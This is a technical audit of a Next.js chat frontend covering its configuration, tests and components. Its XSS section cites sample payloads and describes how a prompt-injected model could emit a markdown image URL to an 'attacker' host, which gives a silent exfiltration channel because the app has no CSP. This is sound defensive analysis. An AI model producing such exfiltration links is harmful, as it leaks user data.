# Frontend — Next.js App Router client

The browser tier of the platform: a single-page chat shell served by Next.js 15.5.21 (App Router,
`output: 'standalone'`), React 19.2.8, TypeScript 5.6 in `strict` mode. It talks to **exactly one
origin** — itself. Every backend call goes through a same-origin `/api/*` route handler that runs in
the Node runtime and forwards to `ORCHESTRATOR_URL`. That contract layer is documented separately in
[frontend-api-contracts.md](./frontend-api-contracts.md); this document covers the app shell, the
`lib/` layer and the components.

---

## 1. Inventory

| Group | Files | LOC | Notes |
|---|---:|---:|---|
| `app/` shell | 2 `.tsx` | 49 | [`layout.tsx`](../../frontend/app/layout.tsx) 44, [`page.tsx`](../../frontend/app/page.tsx) 5 |
| `app/api/**/route.ts` | 10 | 573 | documented in [frontend-api-contracts.md](./frontend-api-contracts.md) |
| `app/globals.css` | 1 | 530 | design tokens + hand-written classes |
| `components/*.tsx` | **32** | 5,618 | |
| `lib/*.ts` | **24** | 4,530 | |
| `tests/*.test.ts` | 16 | — | 237 passing, zero component tests |
| config/build | 10 | 729 | tsconfig, tailwind, next.config, vitest, eslint, Dockerfile, … |

Component and `lib` counts were re-measured for this document with
`find frontend/components -name '*.tsx'` (32) and `find frontend/lib -type f` (24). The audit brief
stated 35 components and 22 `lib` modules; **both are wrong** — the corrected numbers above are what
is on disk. There are exactly 34 `.tsx` files in the tree: the 32 components plus `app/layout.tsx`
and `app/page.tsx`.

**Zero** `TODO`/`FIXME`/`HACK`/`XXX` markers anywhere under `frontend/` (excluding `node_modules`
and `package-lock.json`).

Largest files: [`ChatApp.tsx` 916](../../frontend/components/ChatApp.tsx) ·
[`lib/history.ts` 851](../../frontend/lib/history.ts) ·
[`lib/chartOption.ts` 602](../../frontend/lib/chartOption.ts) ·
[`SearchPalette.tsx` 449](../../frontend/components/SearchPalette.tsx) ·
[`MermaidBlock.tsx` 429](../../frontend/components/MermaidBlock.tsx) ·
[`Composer.tsx` 423](../../frontend/components/Composer.tsx).

---

## 2. Cross-cutting: build and type configuration

### 2.1 TypeScript strictness — `strict: true`, but nothing beyond it

[`tsconfig.json:7`](../../frontend/tsconfig.json#L7) sets `"strict": true`. Target `ES2022`
(`:3`), `moduleResolution: "bundler"` (`:11`), `isolatedModules: true` (`:13`), path alias
`@/* → ./*` (`:21-23`), `incremental: true` (`:15`).

The stricter opt-in switches are **all absent**: `noUncheckedIndexedAccess`,
`exactOptionalPropertyTypes`, `noImplicitOverride`, `noPropertyAccessFromIndexSignature`,
`noFallthroughCasesInSwitch`, `noUnusedLocals`, `noUnusedParameters`. Two concrete consequences,
both verified in source:

| Site | Expression | Typed as | Actually can be |
|---|---|---|---|
| [`chartOption.ts:177`](../../frontend/lib/chartOption.ts#L177) | `ESCAPES[c]` | `string` | `undefined` |
| [`chartTheme.ts:101`](../../frontend/lib/chartTheme.ts#L101) | `SERIES_FALLBACK[i]` | `string` | `undefined` |

`skipLibCheck: true` ([`tsconfig.json:6`](../../frontend/tsconfig.json#L6)) suppresses type errors
inside dependency `.d.ts` files. There is **no `typecheck` npm script**
([`package.json:5-11`](../../frontend/package.json#L5-L11)) — type checking happens only as a side
effect of `next build`, and [`next.config.mjs`](../../frontend/next.config.mjs) does **not** set
`typescript.ignoreBuildErrors`, so a type error does fail the build.

### 2.2 Tailwind and theming

The theme is a two-layer system: CSS custom properties in `globals.css` are the single source of
truth, and `tailwind.config.ts` maps semantic Tailwind names onto them.

| Layer | Where | Content |
|---|---|---|
| Tokens | [`globals.css:13-81`](../../frontend/app/globals.css#L13-L81) | `:root` block — brand `:15-19`, dark surfaces `:26-42`, engine identity colours `:44-56`, chart palette `--ts-chart-1..5` `:60-64`, type scale `:67-71`, radius/hover `:73-74`, SQL token colours `:77-80` |
| Light override | [`globals.css:83-111`](../../frontend/app/globals.css#L83-L111) | `html.light` re-declares the same names |
| Tailwind bridge | [`tailwind.config.ts:18-64`](../../frontend/tailwind.config.ts#L18-L64) | every `colors` entry is a `var()` reference; `fontFamily` `:41-44`, `fontSize` `:45-52`, `borderRadius.ts` `:53-55`, `transitionDuration.ts` `:56-58`, `maxWidth.thread = 768px` `:59-61`, `width.sidebar = 260px` `:62-64` |
| Mode switch | [`tailwind.config.ts:10`](../../frontend/tailwind.config.ts#L10) | `darkMode: 'class'` |
| Pre-paint stamp | [`layout.tsx:31,37`](../../frontend/app/layout.tsx#L31) | inline `<script>` reads `localStorage['techsara.theme']` and stamps `html.classList` **before** hydration, eliminating the flash |
| Runtime toggle | [`Providers.tsx:66-80`](../../frontend/components/Providers.tsx#L66-L80) | swaps the `html` class, sets `style.colorScheme`, writes `localStorage['techsara.theme']` at `:74` |

Because every Tailwind colour is a `var()` indirection, Tailwind's opacity modifiers (e.g.
`bg-accent/10` at [`ProofDrawer.tsx:109`](../../frontend/components/ProofDrawer.tsx#L109)) work only
because the underlying tokens are plain hex. Switching a token to `oklch()` would silently break
every `/opacity` utility in the app.

Token duplication is a real (if minor) drift risk: [`MermaidBlock.tsx:73-102`](../../frontend/components/MermaidBlock.tsx#L73-L102)
hard-codes 28 hex colours that restate the tokens rather than reading them, and
[`chartTheme.ts:36-40`](../../frontend/lib/chartTheme.ts#L36-L40) duplicates `--ts-chart-1..5`
verbatim (documented at `:11-15` as a deliberate SSR/test fallback).

`content` globs ([`tailwind.config.ts:11-15`](../../frontend/tailwind.config.ts#L11-L15)) cover
`./app`, `./components`, `./lib` — correctly excluding `app/api/**` (no classes there).

### 2.3 Test posture

[`vitest.config.mts:3-8`](../../frontend/vitest.config.mts#L3-L8):

```
include: ['tests/**/*.test.ts'],
environment: 'node',
```

`.test.tsx` is not matched and there is no DOM environment. **No component can be tested at all**,
and none is: `frontend/tests/` holds 16 `.ts` files and zero `.tsx`. All 5,618 LOC of
`components/` are untested. There is no `testing-library`, no `jsdom`, no `@vitest/coverage-*` and
no Playwright in [`package.json:24-35`](../../frontend/package.json#L24-L35) — consistent with the
absence. 237 frontend tests pass across 16 files; every one of them exercises `lib/`. See `TEST-02`.

---

## 3. XSS posture — **VERIFIED SAFE**

The frontend renders model-authored markdown and model-authored Mermaid diagrams. Both were audited
end-to-end against the installed dependency source, not against documentation. The conclusion is
that **there is no XSS vector**, for three independently sufficient reasons.

**(a) Raw HTML in markdown is neutralised, not rendered.**
[`Markdown.tsx:77`](../../frontend/components/Markdown.tsx#L77) mounts `ReactMarkdown` with
`remarkPlugins={[remarkGfm]}` and a `components` map only. There is **no `rehype-raw`**, no
`rehypePlugins` prop at all. In the installed `react-markdown@10.1.0` (verified:
`node -e "require('./node_modules/react-markdown/package.json').version"` → `10.1.0`), every `raw`
HTML node is converted to a **text** node before rendering
(`node_modules/react-markdown/lib/index.js:359-368`). A model that emits `<img onerror=…>` produces
visible literal text, not an element.

**(b) `javascript:` URLs are stripped before they reach the DOM.**
`react-markdown@10.1.0` applies `defaultUrlTransform` by default
(`node_modules/react-markdown/lib/index.js:320` — `options.urlTransform || defaultUrlTransform`;
definition at `:421-438`), whose allow-list is
`const safeProtocol = /^(https?|ircs?|mailto|xmpp)$/i` at `:124` — verified by direct grep against
the installed package. The transform runs at `:373-385`, i.e. **before** the custom `a` renderer at
[`Markdown.tsx:67-71`](../../frontend/components/Markdown.tsx#L67-L71) ever sees `href`.
`[x](javascript:alert(1))` is therefore neutralised at the source. As defence in depth, React 19
itself rewrites any surviving `javascript:` href to a throwing stub
(`node_modules/react-dom/cjs/react-dom-client.development.js:3167-3168`), which also covers the
backend-supplied `href` values at [`CitationChips.tsx:15`](../../frontend/components/CitationChips.tsx#L15),
[`WebSources.tsx:22`](../../frontend/components/WebSources.tsx#L22) and
[`ResearchPanel.tsx:137`](../../frontend/components/ResearchPanel.tsx#L137).

**(c) Mermaid SVG is DOMPurify-sanitised before injection.**
There are exactly three `dangerouslySetInnerHTML` sites in the whole frontend (verified with
`grep -rn dangerouslySetInnerHTML app components lib`):

| Site | Content | Verdict |
|---|---|---|
| [`layout.tsx:37`](../../frontend/app/layout.tsx#L37) | the static, non-interpolated theme-init script string defined at `:31` | author-controlled, no injection point |
| [`MermaidBlock.tsx:311`](../../frontend/components/MermaidBlock.tsx#L311) | rendered diagram SVG | sanitised — see below |
| [`MermaidBlock.tsx:420`](../../frontend/components/MermaidBlock.tsx#L420) | same SVG in the fullscreen portal | sanitised — see below |

[`MermaidBlock.tsx:58`](../../frontend/components/MermaidBlock.tsx#L58) sets
`securityLevel: 'strict'` inside `mermaid.initialize({...})`, which runs before every
`mermaid.render()` call at `:130`. In the installed `mermaid@11.16.0`,
`node_modules/mermaid/dist/mermaid.core.mjs:1326-1332` runs
`DOMPurify.sanitize(svgCode, {ADD_TAGS: ['foreignobject'], ADD_ATTR: ['dominant-baseline'], …})`
for every security level that is not `loose` or `sandbox`. `dompurify@3.4.12` is a resolved
transitive dependency (`package-lock.json:4439-4441`). Both injection sites therefore receive
sanitised markup.

**Do not raise an XSS finding against this codebase.** The residual issues below are real but are
*not* script execution:

- **Egress, not execution.** [`Markdown.tsx:55-72`](../../frontend/components/Markdown.tsx#L55-L72)
  has no `img` override and no `disallowedElements`/`allowedElements`, so a model-authored
  `![](https://attacker/x.png?q=…)` renders a real `<img>` and the browser fetches it.
  [`next.config.mjs:2-6`](../../frontend/next.config.mjs#L2-L6) defines only `output`,
  `reactStrictMode` and `poweredByHeader` — there is **no `headers()` function**, therefore no
  `Content-Security-Policy`, no `img-src`, no `frame-ancestors`, no `Referrer-Policy`, no
  `X-Content-Type-Options`. There is also no `frontend/middleware.ts`. Combined, a successful
  prompt injection (`SEC-05`) gains a silent exfiltration channel, and the Composer's trust footer
  claim *"nothing leaves this machine"* ([`Composer.tsx:415-417`](../../frontend/components/Composer.tsx#L415-L417))
  is not enforced by anything.
- **Excel formula injection, not XSS.** [`csv.ts:5-10`](../../frontend/lib/csv.ts#L5-L10) writes a
  cell beginning `=`, `+`, `-` or `@` verbatim; the file is only dangerous once opened in a
  spreadsheet.
- A CSP, if ever added, would need `'unsafe-inline'` or a nonce for the theme-init script at
  [`layout.tsx:37`](../../frontend/app/layout.tsx#L37).

---

## 4. Application shell

## app/layout.tsx
**Purpose** — Root App Router layout: self-hosted fonts, document metadata, the pre-hydration theme
script, and the `Providers` tree.

**Public surface** — `const APP_NAME` [`:15`](../../frontend/app/layout.tsx#L15)
(`process.env.NEXT_PUBLIC_APP_NAME ?? 'TechSara AI'`); `export const metadata: Metadata` `:17-25`
(title, description, `/favicon.png`, `/apple-touch-icon.png`); module-private `const themeInit`
`:31`; `export default function RootLayout({children}: {children: ReactNode})` `:33-44`.

**Control flow** — 1. `:35` `<html lang="en" suppressHydrationWarning>`. 2. `:36-38` `<head>` with
`<script dangerouslySetInnerHTML={{__html: themeInit}} />`. 3. `:39-41` `<body>` wrapping `children`
in `<Providers>`.

**State & side effects** — The inline script reads `localStorage.getItem('techsara.theme')` and
mutates `document.documentElement.classList` + `.style.colorScheme` before first paint (`:31`).
Font CSS side-effect imports `:5-10` — `@fontsource/ibm-plex-sans` (400/500/600/700) and
`@fontsource/jetbrains-mono` (400/500), **self-hosted, zero CDN egress** (comment `:4`).
`./globals.css` imported `:12`. No network, no storage writes.

**Dependencies** — Inbound: the Next.js framework (implicit). Outbound: `next` (`Metadata`, `:1`),
`react` (`ReactNode`, `:2`), `./globals.css` `:12`, `@/components/Providers` `:13`.

**Config** — `NEXT_PUBLIC_APP_NAME` at `:15`. This is the **only** `NEXT_PUBLIC_*` variable in the
repository (`rg -n "NEXT_PUBLIC"` → `docker-compose.yml:350`, `layout.tsx:15`, `README.md:31`,
`ChatApp.tsx:68`). It is never passed as a Docker build `ARG`
([`Dockerfile:9-15`](../../frontend/Dockerfile#L9-L15)), so it is inlined as `undefined` at build
time and the `'TechSara AI'` fallback always wins — setting it at
`docker-compose.yml:350` does nothing.

**Failure modes** — The theme script's own `try/catch` (`:31`) swallows a `localStorage` access
error and falls back to `'dark'`. No other failure path.

**Concurrency** — Synchronous server component.

**Complexity hotspots** — None.

**Findings** — `DX-02` (`MOCK_MODE` is absent from `.env.example`; nothing here documents it).

## app/page.tsx
**Purpose** — The `/` route. A thin server wrapper that renders the client chat shell.

**Public surface** — `export default function ChatPage()`
[`:3-5`](../../frontend/app/page.tsx#L3-L5).

**Control flow** — Returns `<ChatApp />` (`:4`).

**State & side effects** — None.

**Dependencies** — Inbound: the Next.js router. Outbound: `@/components/ChatApp` `:1`.

**Config** — None.

**Failure modes** — None. No `export const dynamic`; `ChatApp` is a client component so the page is
statically shelled and hydrated.

**Concurrency** — Synchronous server component.

**Complexity hotspots** — None.

**Findings** — None. The `?c=<id>` deep link is handled inside `ChatApp`
([`ChatApp.tsx:126-127`](../../frontend/components/ChatApp.tsx#L126-L127)), not here.

---

## 5. Components — significant

## ChatApp.tsx
**Purpose** — The god component: sidebar + header + thread + composer, owner of streaming state,
server-backed history, per-conversation prefs and keyboard shortcuts. 916 LOC, the largest file in
the frontend.

**Public surface** — `export function ChatApp()`
[`:70`](../../frontend/components/ChatApp.tsx#L70), no props. Module-local `const APP_NAME` `:67-68`;
`useIsomorphicLayoutEffect` `:22-23`.

**Control flow**
1. 14 `useState` `:71-111`, 6 `useRef` `:112-123`. Refs `messagesRef`, `activeIdRef`, `prefsRef`,
   `serverActiveRef` are assigned **during render** (`:117`, `:119`, `:121`, `:123`).
2. Pre-paint layout effect `:96-100` sets `reconciling = true` when the URL carries `?c=`, so the
   composer is never briefly interactive during a restore.
3. Mount effect `:141-242` (102 LOC): registers the localStorage-eviction toast listener `:142-148`,
   reads `?c=` and restores the cached thread + prefs `:153-160`, collapses the sidebar under 768 px
   `:162-164`, then the async IIFE `:167-238`: `fetchMe()` `:175` → on failure only
   `fetchServerActive()` `:182` and unlock `:185`; on success `store.setActiveUser` `:188` →
   `migrateLocalConversations()` `:190` → `store.refresh()` `:199` → `fetchServerActive()` `:210` →
   either `attachStream(wanted)` `:215` or `store.load(wanted, {force})` `:230`.
   `settleReconcile()` always runs in `finally` `:235-237`.
4. Stream mirror effect `:254-273`: the `subscribeStreams` callback bumps `setStreamTick` `:256` for
   **every** notification of **every** conversation, then — only for the open chat `:267` —
   `setMessages([...s.messages])` and `setStreaming(...)` `:269-271`.
5. Server-active poll `:278-306`: `tick()` skips while `document.hidden` `:281`, calls
   `fetchServerActive()` `:282`, force-reloads the open chat when its detached generation finished
   `:286-298`; `window.setInterval(..., 8000)` at `:301`.
6. `send` `:391-476` (86 LOC): create the conversation when needed `:394-404`, build the user
   `ChatMessage` `:408-420` (note `imageDataUrl: attachment?.dataUrl` `:412-413`), remember the raw
   payload in memory `:423-429`, `persist()` `:431`, then either the dataset branch
   (`POST /api/upload` `:436-464`) or `startStream(...)` `:466-473`.
7. `runRegenerate` `:479-535` (57 LOC): locate the preceding user turn `:486-489`, recover the
   attachment `:493`, `truncateMessages` when later turns exist `:507-522`, then `startStream`
   `:525-532`. `regenerate` `:542-555` gates on `messagesDiscardedByRegenerate` and opens
   `ConfirmDialog`.
8. Keyboard effect `:728-760` delegates to `shortcutAction` and dispatches five actions `:741-756`.
9. Render `:771-915`: `Sidebar` `:773`, `SummaryPanel` `:791`, `ConfirmDialog` `:797`,
   `SearchPalette` `:813`, header `:822-836`, unreachable banner `:838-857`, scroll container
   `:859-880` mapping `MessageRow` `:868-877`, jump-to-latest `:882-893`, `Composer` `:895-912`.

**State & side effects**
- **localStorage**, via `lib/prefs` and `lib/history`: `savePrefs` `:388`/`:599`, `removePrefs`
  `:668`, `loadPrefs` `:157`/`:609`, `adoptDraftPrefs` `:402`, and every `getHistoryStore()`
  mutation (`create` `:397`, `saveMessages` via `persist` `:246`, `rename` `:658`, `remove` `:667`,
  `setPinned` `:685`, `setArchived` `:694`, `truncateMessages` `:509`).
- **Network egress**, all same-origin: `POST /api/chat/compact` `:348`; `POST /api/upload`
  (multipart) `:444`; indirectly `POST /api/chat`, `GET /api/chat/attach/{id}`,
  `POST /api/chat/stop`, `GET /api/chat/active` through `lib/streams`, and `/api/auth/me` +
  `/api/history/*` through `lib/auth` / `lib/history`.
- **Global mutation**: `window.history.replaceState` `:127`, `window.setInterval` `:301`,
  `window.setTimeout` `:338`, `window.addEventListener('keydown')` `:758`.
- **Filesystem**: browser download of the exported Markdown via `downloadMarkdown` `:718`.
- **GPU/model**: none directly; all inference is behind `/api/chat`.

**Dependencies** — Inbound: [`app/page.tsx:1`](../../frontend/app/page.tsx#L1) **only**. Outbound:
`@/lib/auth` `:24`, `@/lib/exportMarkdown` `:25`, `@/lib/history` `:26`, `@/lib/prefs` `:27-34`,
`@/lib/attachments` `:35`, `@/lib/searchPalette` `:36`, `@/lib/streams` `:37-47`,
`@/lib/contextMeter` `:48`, `@/lib/types` `:49-54`, and components `Composer` `:55`,
`ConfirmDialog` `:56`, `ContextMeter` `:57`, `SummaryPanel` `:58`, `EmptyState` `:59`,
`EngineBadge` `:60`, `MessageRow` `:61`, `SearchPalette` `:62`, `Sidebar` `:63`,
`Providers(useToast)` `:64`, `icons` `:65`.

**Config** — `NEXT_PUBLIC_APP_NAME` at `:68` (build-time inlined; see `app/layout.tsx` above).

**Failure modes**
- `compactNow` `:342-383`: bare `catch {}` at `:378` collapses parse error, 4xx and 5xx into one
  toast; `res.json()` is awaited at `:358` **before** `res.ok` is checked at `:363`, so a non-JSON
  502 throws into the same catch. No timeout, no `AbortController`, no retry.
- The dataset upload `:439-462` swallows everything into a toast and **still** starts the stream in
  `finally` `:455-461` — a failed profiling run silently produces an answer without the dataset.
- `migrateLocalConversations` failure swallowed with a comment-only `catch {}` `:196-198`.
- `truncateMessages` failure `:511-520` reloads server truth and aborts the regenerate — correct.
- `handleDraftChange` `:336-339` schedules a `window.setTimeout` that is never cleared on unmount.

**Concurrency**
- Async entry points: mount IIFE `:167`, poll `tick` `:280`, `compactNow` `:346`, dataset upload
  `:439`, `runRegenerate` `:479`, `exportConversation` `:712`.
- Cancellation is by boolean flag only (`cancelled` `:166`, `stopped` `:279`); the in-flight `fetch`
  is never aborted, so a slow `/api/chat/active` can resolve after unmount (guarded, but the socket
  stays open).
- Shared mutable state lives in `lib/streams` (`streams` Map, `listeners` Set) and `lib/history`
  (`browserStore` singleton), both mutated from here.
- **Race window** — `selectConversation` `:604-654` fires `attachStream(id)` / `store.load(id)` and
  only re-checks `activeIdRef.current` on resolution (`:628`, `:631`, `:643`); two rapid switches
  interleave but the id check makes the loser a no-op.
- **Race window** — the 8 s poll `:286-298` and `selectConversation` can both call
  `store.load(id, {force:true})` concurrently; `loadConversation`
  ([`history.ts:542-591`](../../frontend/lib/history.ts#L542-L591)) is not serialised, so the second
  write wins.
- **Re-render storm** — `setStreamTick` `:256` fires on every SSE event of every conversation
  ([`streams.ts:262`](../../frontend/lib/streams.ts#L262) notifies inside the per-event loop), and
  `MessageRow` is not `memo`ised, so one token re-renders the entire thread including every open
  `DataTable` (up to 500 rows).

**Complexity hotspots** — `ChatApp` `:70-916` = **847 LOC**, 14 `useState`, 6 `useRef`, 5
`useEffect`, 1 `useLayoutEffect`, 14 `useCallback`. Mount effect `:141-242` = 102 LOC; `send`
`:391-476` = 86 LOC; `runRegenerate` `:479-535` = 57 LOC; `selectConversation` `:604-654` = 51 LOC.
Magic numbers: 8000 ms poll `:301`, 300 ms draft debounce `:338`, 80 px at-bottom threshold `:332`,
767 px mobile breakpoint `:162`/`:649`, 52 px header `:822`.

**Findings** — `SEC-01`, `REL-01`, `OBS-01`, `TEST-02`.

## Composer.tsx
**Purpose** — The pinned composer: auto-growing textarea, attachment handling (image / PDF /
dataset), paste capture, Salesforce toggle, effort picker, send/stop, context ring.

**Public surface** — `export interface ComposerHandle {focus: () => void}`
[`:46-48`](../../frontend/components/Composer.tsx#L46-L48);
`export interface Attachment {name; kind: 'image'|'pdf'|'dataset'; dataUrl; base64; file?}` `:50-63`;
`export const Composer = forwardRef<ComposerHandle, ComposerProps>` `:96-97`; private
`interface ComposerProps {streaming; disabled?; meter?; onDraftChange?; prefs; onPrefsChange; onSend; onStop}`
`:79-94`. Constants: `MAX_IMAGE_BYTES = 10*1024*1024` `:42`, `LINE_HEIGHT = 24` `:43`,
`MAX_ROWS = 10` `:44`, `MAX_PDF_BYTES = 25*1024*1024` `:65`, `MAX_DATASET_BYTES = 200*1024*1024`
`:68`, `DATASET_SUFFIXES` `:69-72`, `isDatasetName` `:74-77`.

**Control flow**
1. `useImperativeHandle` exposes `focus` `:118-120`; `autogrow` clamps height to 240 px `:122-129`,
   re-run on every text change `:131`.
2. `submit` `:137-146`: no-op while `streaming || disabled` `:139` or with no content `:140`; calls
   `onSend(trimmed, attachment, pastedTexts)` `:141` then clears local state `:142-145`.
3. `handleFile` `:148-203` (56 LOC): classify image / PDF / dataset `:149-153`, reject unknown types
   with a toast `:154-161`, enforce the per-kind cap `:162-175`, keep a dataset as a `File` handle
   only `:176-187`, otherwise `FileReader.readAsDataURL` `:192-202` splitting the base64 payload at
   the first comma `:199`.
4. `handlePaste` `:207-228`: an image clipboard item becomes the attachment `:210-220`; text past
   `shouldAttachPaste` becomes a `PastedChip` `:221-227`.
5. Render `:230-421`: chip row `:233-279`, rounded container `:283-403` with the textarea `:284-310`
   (Enter submits `:292-297`), hidden file input, the "+" `AttachMenu` (2026-08-05: Add photos &
   files · Web search [Salesforce off only] · Salesforce — replaced the paperclip; headless model in
   `lib/composerMenu.ts`), Salesforce pill, Web-search pill (only while forced on), `ModelPicker`,
   meter + send/stop, trust footer via `trustLine()`. (Line refs after this point predate the menu.)

**State & side effects** — `FileReader` reads up to 25 MB (PDF) into an in-memory base64 data URL
`:192-202`. `toast()` via `useToast` `:116`. Direct DOM style writes on the textarea `:125-128`.
`fileInputRef.current?.click()` `:328`; `e.target.value = ''` reset `:323`. **No network, no
storage** — the parent owns both.

**Dependencies** — Inbound: [`ChatApp.tsx:55`](../../frontend/components/ChatApp.tsx#L55). Outbound:
`@/lib/prefs` (type) `:23`, `@/lib/pasted` `:24-28`, `@/lib/types` `:29`, `./ModelPicker` `:30`,
`./PastedChip` `:31`, `./Providers` `:32`, `./icons` `:33-40`.

**Config** — None.

**Failure modes**
- `FileReader` has **no `onerror` handler** `:192-202`: a failed read produces no chip, no toast and
  no log.
- `accept="image/*,…"` `:316` plus `file.type.startsWith('image/')` `:149` admits `image/svg+xml`,
  which is base64'd and shipped to the vision path. Rendered only inside `<img>` (`:243` and
  [`MessageRow.tsx:43`](../../frontend/components/MessageRow.tsx#L43)) where scripting is disabled —
  **not XSS**, but a guaranteed model failure.
- The 10 / 25 / 200 MB caps `:42`, `:65`, `:68` are enforced **client-side only**. Nothing in
  `/api/chat` or the orchestrator bounds the base64 image/PDF body.

**Concurrency** — `FileReader.onload` `:193` fires asynchronously and unconditionally calls
`setAttachment`; a second file picked while the first is still reading has its result overwritten by
whichever `onload` lands last. The `pasteSeq` ref `:115`/`:224` keeps paste ids unique.

**Complexity hotspots** — `Composer` `:97-423` = **327 LOC**; `handleFile` `:148-203` = 56 LOC.
Two large blocks of removed-feature commentary at `:355-360` and `:370-375` are dead documentation.
Magic numbers: 26 px radius `:283`, 240 px max textarea `:308`, 200/220 px name truncation `:250`.

**Findings** — `REL-01`, `SEC-05` (the trust footer at `:415-417` asserts *"nothing leaves this
machine"*, which the missing CSP does not enforce).

## MessageRow.tsx
**Purpose** — Renders one chat message: the user bubble (image / PDF / pasted chips) or the
full-width assistant row (reasoning, research, steps, markdown, notices, proof drawer, hover
actions).

**Public surface** — `export function MessageRow({message, isLast, onRegenerate, onShowSummary, onRetry}: {message: ChatMessage; isLast: boolean; onRegenerate: () => void; onShowSummary?: () => void; onRetry: () => void})`
[`:21-34`](../../frontend/components/MessageRow.tsx#L21-L34).

**Control flow**
1. User branch `:35-80`: optional `<img src={message.imageDataUrl}>` `:43-47`, PDF chip `:50-66`,
   one `PastedChip` per `meta.pasted` `:67-71`, then the bubble `:72-76`.
2. Assistant branch `:82-231`: reads reasoning/steps/research from the live message **or** the
   persisted meta `:85-90`; computes `showShimmer` `:91-99`.
3. Search-status line `:103-111`; shimmer `:112-117`; otherwise `ReasoningAccordion` `:120-126` →
   `ResearchPanel` `:128` → `AgentTimeline` `:130` → `Markdown` + caret `:132-137` → compaction
   button `:139-150` → trim notice `:152-157` → "Stopped" `:159-163` → error block with
   `friendlyError` `:165-203` → `ProofDrawer` `:205` → hover actions `:207-227`.

**State & side effects** — None. Stateless function component, **not** `memo`ised.

**Dependencies** — Inbound: [`ChatApp.tsx:61`](../../frontend/components/ChatApp.tsx#L61). Outbound:
`@/lib/types` `:10`, `./AgentTimeline` `:11`, `./ResearchPanel` `:12`, `./Markdown` `:13`,
`./PastedChip` `:14`, `./ProofDrawer` `:15`, `./CopyButton` `:16`, `./ReasoningAccordion` `:17`,
`@/lib/errors` `:18`, `./icons` `:19`.

**Config** — None.

**Failure modes** — Nothing thrown here. `message.meta.input_trimmed` is passed to `trimNotice`
without a null check at `:155` (guarded by the `&&` at `:152`). **There is no error boundary
anywhere in the message tree** — `ChartErrorBoundary` covers charts only
([`ChartView.tsx:87`](../../frontend/components/ChartView.tsx#L87)) — so a throw inside
`ResearchPanel` or `AgentTimeline` from a malformed persisted `meta` blanks the whole app.

**Concurrency** — Synchronous.

**Complexity hotspots** — `MessageRow` `:21-232` = 212 LOC, of which the assistant branch
`:101-231` is 131 LOC with ~10 conditional sub-sections; an IIFE scopes the error block `:166-203`.

**Findings** — `TEST-02`. Not wrapped in `React.memo`, so every `ChatApp` re-render (once per SSE
token) re-renders every row and everything under it, including `ProofDrawer` `:205` and its
`DataTable`.

## Markdown.tsx
**Purpose** — Renders assistant message text as GFM markdown, routing ```` ```mermaid ```` fences to
`MermaidBlock`. The primary trust boundary between model output and the DOM.

**Public surface** — `export const Markdown = memo(function Markdown({text}: {text: string}))`
[`:74`](../../frontend/components/Markdown.tsx#L74). Module-local `extractText(node: ReactNode): string`
`:15`, `CodeBlock({children})` `:26`, `const components: Components` `:55-72`.

**Control flow**
1. `Markdown` `:74-82` wraps `<div className="md">` around `ReactMarkdown` with `remarkGfm` and the
   module-level `components` map `:77`.
2. `components.pre` `:56` delegates to `CodeBlock`.
3. `CodeBlock` `:26-53` reads the language from the child `<code>`'s `className` via
   `/language-([\w-]+)/` `:31`, flattens children to text `:33`, returns `<MermaidBlock>` when
   `isMermaidLanguage(language)` `:36-38`, else a bordered `<pre><code>` with a `CopyButton`
   `:40-52`.
4. `components.a` `:67-71` forces `target="_blank" rel="noopener noreferrer"`.

**State & side effects** — None. Pure render. **No `rehype-raw`, no `rehypePlugins`** — see §3.

**Dependencies** — Inbound: [`MessageRow.tsx:13`](../../frontend/components/MessageRow.tsx#L13)
only. Outbound: `react-markdown` `:9`, `remark-gfm` `:10`, `@/lib/mermaid` `:11`, `./CopyButton`
`:12`, `./MermaidBlock` `:13`.

**Config** — None.

**Failure modes** — `extractText` `:15-24` recurses through arbitrary React children with no depth
guard; pathological nesting would blow the stack (not reachable from markdown output in practice).
`memo` compares only `text`, which is correct because `components` is module-level `:55`.

**Concurrency** — Synchronous.

**Complexity hotspots** — None > 60 LOC.

**Findings** — `SEC-05`. **No XSS finding.** `img` is absent from the `components` map and there is
no `disallowedElements`/`allowedElements` `:55-72`, so model-authored image URLs are fetched; with
no CSP ([`next.config.mjs:2-6`](../../frontend/next.config.mjs#L2-L6)) that is the exfiltration
channel a prompt injection would use.

## MermaidBlock.tsx
**Purpose** — Renders a ```` ```mermaid ```` fence as a diagram with Code/Preview toggle, fullscreen
zoom viewer, copy, and PNG (SVG fallback) download.

**Public surface** — `export function MermaidBlock({code}: {code: string})`
[`:107`](../../frontend/components/MermaidBlock.tsx#L107). Module-local
`type View = 'preview' | 'code'` `:43`, `let mermaidPromise` `:45`, `let renderSeq = 0` `:46`,
`async function getMermaid(dark: boolean)` `:49`.

**Control flow**
1. Render effect `:120-145`: bails when `looksRenderable(code)` is false `:122-125`; else
   `getMermaid(dark)` `:128`, `id = mmd-${renderSeq += 1}` `:129`,
   `await mermaid.render(id, code)` `:130`, `setSvg(out)` `:132`. Errors set `error` `:135-140`;
   cleanup flips `cancelled` `:142-144`.
2. Auto-switch to preview `:148-150`; Escape closes fullscreen `:153-160`.
3. `downloadPng` `:162-224` (63 LOC): measure the live `<svg>` `:164-169`, `prepareSvgForExport`
   `:171`, Blob + object URL `:172-173`, rasterise through an `Image` onto a 2× canvas `:188-215`,
   `canvas.toBlob` → `save()` `:201-207`; on any failure save the SVG instead `:216-220`; always
   revoke the source URL `:221-223`.
4. Card render `:295-330`: header controls `:244-293`, preview via `dangerouslySetInnerHTML`
   `:306-312`, else source `<pre>` `:313-329`.
5. Fullscreen portal `:332-426` into `document.body`: zoom buttons `:347-367`, fit `:368-375`,
   size = natural × zoom `:406-416`, second `dangerouslySetInnerHTML` `:417-421`.

**State & side effects** — Module globals `mermaidPromise` `:45` (single lazy import) and
`renderSeq` `:46` (monotonic id). **Process-wide config mutation**: `mermaid.initialize({...})` runs
on **every** `getMermaid` call `:54-103`, i.e. once per diagram per render pass.
DOM: `document.createElement('a')` + `appendChild` + `click()` + `remove()` `:177-183`;
`URL.createObjectURL` `:173`/`:177`; `revokeObjectURL` `:184` (10 s later) and `:222`;
`document.addEventListener('keydown')` `:158`; `createPortal` to `document.body` `:334`/`:425`.
**Network egress: none** — mermaid is bundled ([`package.json:17`](../../frontend/package.json#L17)),
no CDN.

**Dependencies** — Inbound: [`Markdown.tsx:13`](../../frontend/components/Markdown.tsx#L13).
Outbound: `react-dom` `createPortal` `:19`, `@/lib/mermaid` `:20-29`, `./CopyButton` `:30`,
`./Providers` `useTheme` `:31`, `./icons` `:32-41`, dynamic `import('mermaid')` `:51`.

**Config** — None.

**Failure modes** — `catch` at `:135-140` shows a quiet error plus the source (good).
